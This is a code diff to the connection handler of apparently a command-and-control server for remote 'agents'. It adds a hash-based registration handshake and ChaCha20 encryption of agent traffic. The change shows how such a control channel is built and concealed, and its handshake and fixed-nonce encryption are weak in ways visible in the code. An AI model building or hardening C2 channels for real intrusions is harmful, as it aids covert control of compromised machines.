@@ -10,16 +10,19 @@ For each connection:
 """
 
 import asyncio
+import hashlib
 import logging
 import time
 from typing import Optional
 
 from src.c2.agent_registry import AgentInfo, AgentRegistry
+from common.crypto import NONCE_AGENT_TO_C2, NONCE_C2_TO_AGENT, ChaCha20, EncryptedStream, derive_key
 from common.protocol import (
     CMD_DISCONNECT,
     CMD_HEARTBEAT,
     CMD_HEARTBEAT_ACK,
     CMD_REGISTER,
+    CMD_REGISTER_CONFIRM,
     CMD_REGISTER_RESPONSE,
     PacketReader,
     ProtocolError,
@@ -38,13 +41,13 @@ class NetworkServer:
         registry: AgentRegistry,
         host: str,
         port: int,
-        auth_tokens: list,
+        auth_token: str = "",
         heartbeat_timeout: int = 60,
     ) -> None:
         self._registry = registry
         self._host = host
         self._port = port
-        self._auth_tokens = set(auth_tokens or [])
+        self._auth_token = auth_token or ""
         self._heartbeat_timeout = heartbeat_timeout
         self._server: Optional[asyncio.AbstractServer] = None
         self._watchdog_task: Optional[asyncio.Task] = None
@@ -112,36 +115,70 @@ class NetworkServer:
         logger.info(f"incoming connection from {peer}")
         pr = PacketReader()
         try:
-            register_info = await self._read_register(reader, pr)
-            if register_info is None:
+            info = await self._handshake(reader, writer, pr)
+            if info is None:
+                logger.warning("registration handshake failed")
                 writer.close()
                 return
-            agent_id, hostname, os_name = register_info
-            info = AgentInfo(
-                id=agent_id,
-                hostname=hostname,
-                os=os_name,
-                connected_at=time.time(),
-                last_heartbeat=time.time(),
-                writer=writer,
-            )
             await self._registry.register(info)
-            try:
-                pkt = encode_response(
-                    0,
-                    CMD_REGISTER_RESPONSE,
-                    f"{CMD_REGISTER_RESPONSE}:accepted=true",
-                )
-                writer.write(pkt)
-                await writer.drain()
-            except Exception:
-                pass
-
-            await self._serve_connection(reader, writer, pr, agent_id)
+            await self._serve_connection(info.writer, pr, info)
         except Exception as e:
             logger.warning(f"connection handler error: {e}")
         finally:
             writer.close()
+
+    async def _handshake(
+        self,
+        reader: asyncio.StreamReader,
+        writer: asyncio.StreamWriter,
+        pr: PacketReader,
+    ) -> Optional[AgentInfo]:
+        """Challenge-response registration handshake.
+
+        1. Agent sends ``register`` carrying a random nonce (no plaintext token).
+        2. C2 replies with ``register_response`` whose body is
+           ``sha256(nonce + c2_auth_tokens)``.
+        3. Agent verifies the hash locally; on success it replies with
+           ``register_confirm``.
+        4. C2 registers the Agent only after receiving ``register_confirm``.
+        """
+        register_info = await self._read_register(reader, pr)
+        if register_info is None:
+            return None
+        agent_id, nonce, hostname, os_name = register_info
+
+        if not self._auth_token:
+            logger.warning("c2_auth_tokens is not configured; refusing registration")
+            return None
+
+        digest = self._challenge_hash(nonce)
+        try:
+            writer.write(encode_response(0, CMD_REGISTER_RESPONSE, digest))
+            await writer.drain()
+        except Exception:
+            return None
+
+        if not await self._wait_confirm(reader, pr, agent_id):
+            return None
+
+        # Handshake + auth succeeded: switch the whole byte stream to
+        # ChaCha20 encryption keyed by sha256(c2_auth_tokens).
+        key = derive_key(self._auth_token)
+        tx = ChaCha20(key, NONCE_C2_TO_AGENT)
+        rx = ChaCha20(key, NONCE_AGENT_TO_C2)
+        stream = EncryptedStream(reader, writer, tx, rx)
+
+        return AgentInfo(
+            id=agent_id,
+            hostname=hostname,
+            os=os_name,
+            connected_at=time.time(),
+            last_heartbeat=time.time(),
+            writer=stream,
+        )
+
+    def _challenge_hash(self, nonce: str) -> str:
+        return hashlib.sha256((nonce + self._auth_token).encode("utf-8")).hexdigest()
 
     async def _read_register(
         self,
@@ -162,11 +199,11 @@ class NetworkServer:
                 if len(params) < 4:
                     logger.warning("register missing fields")
                     return None
-                agent_id, auth_token, hostname, os_name = params[:4]
-                if self._auth_tokens and auth_token not in self._auth_tokens:
-                    logger.warning(f"auth_token rejected for {agent_id}")
+                agent_id, nonce, hostname, os_name = params[:4]
+                if not agent_id or not nonce:
+                    logger.warning("register missing agent_id/nonce")
                     return None
-                return agent_id, hostname, os_name
+                return agent_id, nonce, hostname, os_name
             try:
                 chunk = await asyncio.wait_for(reader.read(4096), timeout=30)
             except asyncio.TimeoutError:
@@ -176,30 +213,64 @@ class NetworkServer:
                 return None
             pr.feed(chunk)
 
-    async def _serve_connection(
+    async def _wait_confirm(
         self,
         reader: asyncio.StreamReader,
-        writer: asyncio.StreamWriter,
         pr: PacketReader,
         agent_id: str,
+        timeout: float = 30.0,
+    ) -> bool:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            pkt = pr.next_packet()
+            if pkt is not None:
+                _req_id, _body_len, cmd, body = pkt
+                if cmd == CMD_REGISTER_CONFIRM:
+                    try:
+                        params = decode_tlv(body)
+                    except ProtocolError:
+                        params = []
+                    if params and params[0] != agent_id:
+                        logger.warning(f"register_confirm agent mismatch for {agent_id}")
+                        return False
+                    return True
+                logger.warning(f"unexpected packet during handshake: cmd={cmd:#x}")
+                return False
+            remaining = deadline - time.time()
+            if remaining <= 0:
+                return False
+            try:
+                chunk = await asyncio.wait_for(reader.read(4096), timeout=remaining)
+            except asyncio.TimeoutError:
+                return False
+            if not chunk:
+                return False
+            pr.feed(chunk)
+        return False
+
+    async def _serve_connection(
+        self,
+        stream,
+        pr: PacketReader,
+        info: AgentInfo,
     ) -> None:
-        info = self._registry.get(agent_id)
+        stream.absorb_leftover(pr)
         try:
             while True:
                 pkt = pr.next_packet()
                 if pkt is not None:
-                    await self._dispatch_packet(writer, pr, info, pkt)
+                    await self._dispatch_packet(stream, pr, info, pkt)
                     continue
                 try:
-                    chunk = await reader.read(4096)
+                    chunk = await stream.read(4096)
                 except Exception:
                     return
                 if not chunk:
                     return
                 pr.feed(chunk)
         finally:
-            if self._registry.get(agent_id) is not None:
-                await self._registry.unregister(agent_id)
+            if self._registry.get(info.id) is not None:
+                await self._registry.unregister(info.id)
 
     async def _dispatch_packet(
         self,
@@ -214,7 +285,13 @@ class NetworkServer:
 
         if cmd == CMD_HEARTBEAT:
             self._registry.touch_heartbeat(info.id)
-            ts = body.decode("utf-8", errors="replace").strip() or str(int(time.time()))
+            try:
+                params = decode_tlv(body)
+            except ProtocolError:
+                params = []
+            ts = params[0].strip() if params else ""
+            if not ts:
+                ts = str(int(time.time()))
             try:
                 async with info.write_lock:
                     writer.write(encode_response(req_id, CMD_HEARTBEAT_ACK, ts))
